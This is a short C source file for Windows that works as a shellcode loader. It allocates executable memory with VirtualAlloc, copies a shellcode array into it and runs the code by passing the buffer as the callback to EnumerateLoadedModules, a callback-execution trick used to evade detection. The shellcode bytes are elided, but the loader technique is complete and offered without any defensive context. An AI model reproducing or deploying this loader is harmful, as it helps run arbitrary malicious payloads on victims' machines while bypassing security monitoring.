#include <windows.h>
#include <stdio.h>
#include <dbghelp.h>

unsigned char shellcode[] = ...

int main() {
    LPVOID addr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    RtlMoveMemory(addr, shellcode, sizeof(shellcode));
    EnumerateLoadedModules(GetCurrentProcess(), (PENUMLOADED_MODULES_CALLBACK)addr, 0);
}